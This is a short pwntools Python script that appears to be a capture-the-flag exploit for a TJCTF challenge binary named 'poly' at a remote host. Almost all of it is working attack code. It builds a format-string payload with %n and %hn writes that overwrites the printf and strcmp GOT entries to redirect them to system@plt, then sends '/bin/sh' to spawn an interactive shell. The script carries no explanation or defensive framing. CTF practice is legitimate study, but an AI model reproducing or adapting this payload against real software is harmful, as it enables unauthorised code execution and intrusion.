#!/usr/bin/env python

from pwn import *

r = remote("p1.tjctf.org", 8003)

# r = process("./poly")
# gdb.attach(r, '''
# 	set disable-randomization off
# 	break *0x400b0a
# 	c
# 	''')

r.sendline("4")
r.sendline("3")

r.recvuntil("below:")

# that's 0x602048 to 0x4009fa and 0x602058 to 0x4006e0

STRCMP			= 0x602058
PRINTF			= 0x602048
SYSTEM_PLT		= 0x4006e0
VIEW_TEAM		= 0x400993
VIEW_TEAM_OFF     = 0x4009fa

payload = ''
payload += "%57x%30$n".rjust(16)
payload += "%1692x%31$hn".rjust(16)
payload += "%789x%32$hn".rjust(16)
payload += p64(PRINTF + 2)
payload += p64(STRCMP)
payload += p64(PRINTF)

r.sendline(payload)

r.sendline("/bin/sh")
# r.sendline("cat flag.txt")

r.interactive()
